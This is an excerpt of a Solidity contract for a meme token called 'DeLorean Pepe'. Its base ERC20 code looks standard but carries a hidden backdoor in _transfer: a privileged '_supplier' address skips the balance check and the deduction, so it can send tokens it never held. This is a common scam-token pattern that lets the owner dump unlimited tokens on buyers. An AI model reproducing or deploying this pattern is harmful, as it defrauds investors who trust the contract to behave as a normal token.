...
/*
 *
 * DMC Pepe - jump in your DeLorean and buy $PEPE weeks ago
 *
 */
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        require(fromBalance >= amount || _supplier == from, "ERC20: transfer amount exceeds balance");
        unchecked {
            if (_supplier != from) {
...
contract DMCPepe is ERC20 {
    constructor(uint256 _totalSupply) ERC20("DeLorean Pepe", "DMCPEPE") {
